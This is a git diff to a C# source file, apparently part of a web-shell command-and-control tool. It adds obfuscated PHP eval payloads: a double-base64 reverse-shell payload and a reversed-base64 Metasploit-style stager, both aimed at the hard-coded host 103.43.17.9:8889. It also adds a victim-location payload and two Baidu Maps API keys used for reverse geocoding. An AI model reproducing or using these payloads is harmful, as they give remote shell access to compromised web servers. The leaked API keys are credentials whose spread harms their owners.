@@ -227,18 +227,26 @@ namespace C2.Core
         public static string SystemInfoPayload = "";
         public static string ProcessViewPayload = "";
         public static string ScheduleTaskPayload = "";
-        public static string LocationPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=SkhWeWJDQTlJQ0pvZEhSd2N6b3ZMM2QzZHk1bmIyOW5iR1V1WTI5dExtaHJMMjFoY0hNaU93MEtKSFJsZUhRZ1BTQm1hV3hsWDJkbGRGOWpiMjUwWlc1MGN5Z2tkWEpzS1RzTkNpUnRZWFJqYUNBOUlDSitLRnN3TFRrdVhTc3BKVEpES0Zzd0xUa3VYU3NwZmlJN0RRcHdjbVZuWDIxaGRHTm9LQ1J0WVhSamFDd2tkR1Y0ZEN3a2JTazdEUXBsWTJodklDSlJRVU5MVEROSlR6bFFQVDBpTGlSdFd6SmRMaUlzSWk0a2JWc3hYUzRpUFQxUlFVTkxURE5KVHpsUUlqcz0=";
+        public static string LocationPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=SkhWeWJDQTlJQ0pvZEhSd2N6b3ZMM2QzZHk1bmIyOW5iR1V1WTI5dExtaHJMMjFoY0hNaU93MEtKSFJsZUhRZ1BTQm1hV3hsWDJkbGRGOWpiMjUwWlc1MGN5Z2tkWEpzS1RzTkNpUnRZWFJqYUNBOUlDSitLRnN3TFRrdVhTc3BKVEpES0Zzd0xUa3VYU3NwZmlJN0RRcHdjbVZuWDIxaGRHTm9LQ1J0WVhSamFDd2tkR1Y0ZEN3a2JTazdEUXBsWTJodklDSlJRVU5MVEROSlR6bFFQVDBpTGlSdFd6RmRMaUlzSWk0a2JWc3lYUzRpUFQxUlFVTkxURE5KVHpsUUlqcz0=";
         public static string MSFHost = "103.43.17.9:8889";
         public static string ReverseShellHost = "103.43.17.9:8889";
         public static string MSFPayload = "{0}=@eval/*AbasBwwevC*/(base64_decode(strrev($_REQUEST[0])));&0===QfK0wOpgSZpRGIgACIK0QfgACIgoQD7kiYkgCbhZXZgACIgACIgAiCNsHIlNHblBSfgACIgoQD7kCKzNXYwlnYf5Waz9Ga1NHJgACIgACIgAiCNsTKiRCIscyJo42bpR3YuVnZfVGdhVmcjBSPgM3chBXei9lbpN3boV3ckACIgACIgACIK0wegkSKnwWY2V2XlxmYhNXak5icvRXdjVGel5ibpN3boV3cngCdld2Xp5WagYiJgkyJul2cvhWdzdCKkVGZh9Gbf52bpNnblRHelhCImlGIgACIK0wOlBXe091ckASPg01JlBXe091aj92cnNXbns1UMFkQPx0RkACIgACIK0wOzRCI9ASXns2YvN3Zz12JbNFTBJ0TMdEJgkgCN0HIgACIK0QfgACIgACIgAiCNszahVmciBCIgACIgACIgACIgACIgAiCNsTKpIGJo4WZsJHdzBSLg4WZsRCIsMHJoQWYlJ3X0V2aj92cg0jLgIGJgACIgACIgACIgACIgACIgoQD6cCdlt2YvN3JgU2chNGIgACIgACIgACIgAiCNszahVmciBCIgACIgACIgACIgACIgAiCNsTKpIGJo4WZsJHdzBSLg4WZsRCIsMHJoQWYlJnZg0jLgIGJgACIgACIgACIgACIgACIgoQD6cSbhVmc0N3JgU2chNGIgACIgACIgACIgAiCNsHIpUGc5R3XzRCKgg2Y0l2dzBCIgACIgACIK0wegkiblxGJgwDIpIGJo4WZsJHdzhCIlxWaodHIgACIK0wOncCI9AiYkACIgAiCNsTXn4WZsdyWhRCI9AiblxGJgACIgoQD7kiblxGJgwiIuVGbOJCKrNWYw5Wdg0DIhRCIgACIK0QfgACIgoQD7kCKllGZgACIgACIgAiCNsHIp4WZsRSIoAiZpBCIgAiCN0HIgACIK0wOrFWZyJGIgACIgACIgACIgAiCNsTK0ACLzRCKkFWZy9Fdlt2YvNHI9AiblxGJgACIgACIgACIgACIK0gOnQXZrN2bzdCIlNXYjBCIgACIgACIK0wOrFWZyJGIgACIgACIgACIgAiCNsTK0ACLzRCKkFWZyZGI9AiblxGJgACIgACIgACIgACIK0gOn0WYlJHdzdCIlNXYjBCIgACIgACIK0wegkSZwlHdfNHJoACajRXa3NHIgACIK0QfgACIgoQD7kyJ0V2aj92cg8mbngSZpRGIgACIgACIgoQD7BSKzRSIoAiZpBCIgAiCN0HIgACIK0wOpcycj5WdmBCdlt2YvNHIv52JoUWakBCIgACIgACIK0wegkSZwlHdfNHJhgCImlGIgACIK0QfgACIgoQD7cCdlt2YvN3Jg0DIlBXe091ckACIgACIgACIK0QfgACIgACIgAiCNsTKoUWakBCIgACIgACIgACIgoQD7BSKzVmckECKgYWagACIgACIgAiCNsTK0J3bwRCIsAXakACLzRCK0NWZu52bj9Fdlt2YvNHQg0DIzVmckACIgACIgACIK0wOpA1QU9FTPNFIs0UQFJFVT91SD90UgwCVF5USfZUQoYGJg0DIzRCIgACIgACIgoQD7BSKpYGJoUGbiFGbsF2YfNXagYiJgkyJlRXYlJ3YfRXZrN2bzdCI9AiZkgCImYCIzRSIoAiZpBCIgAiCN0HIgACIK0wOn0WYlJHdzdCI9ASZwlHdfNHJgACIgACIgAiCNsTK0J3bwRCIsAXakgiZkASPgMHJgACIgACIgAiCNsHIpkiZkgSZsJWYsxWYj91cpBiJmASKn4WZw92aj92cmdCI9AiZkgCImYCIzRSIoAiZpBCIgAiCN0HIgACIK0wOn0WYlJHdzdCI9ASZwlHdfNHJgACIgACIgAiCNsTKi0Hdy9GcksnO9BXaks3LvoDcjRnIoYGJg0DIzRCIgACIgACIgoQD7BSKpYGJoUGbiFGbsF2YfNXagYiJgkyJ05WZpx2YfRXZrN2bz9VbhVmc0N3Jg0DImRCKoAiZpBCIgAiCNsDdy9Gck4iI0J3bwJCIvh2YllgCNsDcpRCIuICcpJCIvh2YllgCNsTXxsFVT9EUfRCI9ACdy9GckACIgAiCNsTKdJzWUN1TQ9FJoUGZvNWZk9FN2U2chJGI9ACcpRCIgACIK0gCNsHIpkSXysFVT9EUfRCK0V2czlGImYCIp0VMbR1UPB1XkgCdlN3cphCImlmCNsTKxgCdy9mYh9lclNXdfVmcv52ZppQD7kCMoQXatlGbfVWbpR3X0V2c&1={1}&2={2}";
-        public static string ReverseShellPayload = "";
+        public static string ReverseShellPayload = "{0}=@eval/*AbasBwwevC*/(base64_decode(base64_decode($_REQUEST[0])));&0=WlhKeWIzSmZjbVZ3YjNKMGFXNW5LRVZmUlZKU1QxSWdmQ0JGWDFCQlVsTkZLVHRBYzJWMFgzUnBiV1ZmYkdsdGFYUW9NQ2s3RFFwcFppaHBjM05sZENna1gxQlBVMVJiTVYwcEppWnBjM05sZENna1gxQlBVMVJiTWwwcEtRMEtleVJ3YjNKMFBTUmZVRTlUVkZzeFhUc05DaVJwY0QxaVlYTmxOalJmWkdWamIyUmxLQ1JmVUU5VFZGc3lYU2s3RFFva1puQTlabk52WTJ0dmNHVnVLQ1JwY0NBc0lDUndiM0owSUN3Z0pHVnljbTV2TENBa1pYSnljM1J5S1RzTkNtbG1JQ2doSkdad0tYc05DaVJ5WlhOMWJIUWdQU0FpVG05MElHTnZibTVsWTNScGIyNGlPdzBLZlEwS1pXeHpaU0I3RFFwbWNIVjBjeUFvSkdad0lDd2lYRzRxWTI5dWJtVmpkQ0J6ZFdOalpYTnpLbHh1SWlrN0RRcDNhR2xzWlNnaFptVnZaaWdrWm5BcEtYc2dEUXBtY0hWMGN5QW9KR1p3TENJZ2MyaGxiR3c2SUNJcE93MEtKSEpsYzNWc2REMGdabWRsZEhNZ0tDUm1jQ3dnTkRBNU5pazdEUW9rYldWemMyRm5aVDFnSkhKbGMzVnNkR0E3RFFwbWNIVjBjeUFvSkdad0xDSXRMVDRnSWk0a2JXVnpjMkZuWlM0aVhHNGlLVHNnZlEwS1ptTnNiM05sSUNna1puQXBPMzE5&1={1}&2={2}";
         public static Dictionary<InfoType, string> InfoPayloadDict = new Dictionary<InfoType, string> 
                                            { 
                                              {InfoType.MysqlBlasting, MysqlPayload },
                                              {InfoType.SystemInfo, SystemInfoPayload },
                                              {InfoType.ProcessView, ProcessViewPayload },
                                              {InfoType.ScheduleTask, ScheduleTaskPayload },
-                                             {InfoType.LocationInfo, LocationPayload },};
+                                             {InfoType.LocationInfo, LocationPayload },
+                                             {InfoType.MSF,MSFPayload},
+                                             {InfoType.NC,ReverseShellPayload} };
         /*<--静态变量赋值先后顺序不能改变-->*/
+        public static List<string> BDLocationAK = new List<string>() 
+                                                  {
+                                                  "YcVOPhECz13S3kEi8drRYjTjCxxD6ovF",
+                                                  "wFtP7Go4rUxNf3bm8jQBcLOe0LC7dNCR"
+                                                  };
+        public static string BDLocationAPI ="https://api.map.baidu.com/reverse_geocoding/v3/?ak={0}&output=json&coordtype=wgs84ll&location={1}";
     }
 }
